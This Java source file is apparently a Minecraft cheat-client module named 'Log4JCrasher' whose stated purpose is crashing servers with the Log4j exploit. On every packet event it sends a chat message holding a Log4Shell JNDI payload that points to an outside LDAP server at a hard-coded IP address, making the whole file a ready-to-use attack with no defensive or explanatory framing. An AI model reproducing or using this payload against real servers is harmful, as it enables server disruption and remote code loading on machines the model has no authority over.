package beta.tiredb56.module.impl.list.misc;

import beta.tiredb56.api.annotations.ModuleAnnotation;
import beta.tiredb56.event.EventTarget;
import beta.tiredb56.event.events.PacketEvent;
import beta.tiredb56.module.ModuleCategory;
import beta.tiredb56.module.Module;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.network.play.client.C01PacketChatMessage;

@ModuleAnnotation(name = "Log4JCrasher", category = ModuleCategory.MISC, clickG = "Crashing server with log4j exploit")
public class Log4JCrasher extends Module {

	@EventTarget
	public void onPacket(PacketEvent e) {
		if (MC.thePlayer == null || MC.theWorld == null) {
			executeMod();
			return;
		}

		MC.getNetHandler().getNetworkManager().sendPacket(new C01PacketChatMessage("${jndi:ldap://145.239.88.127:1389/a}"), null);

		executeMod();
	}
	@Override
	public void onState() {

	}
	@Override
	public void onUndo() {

	}
}
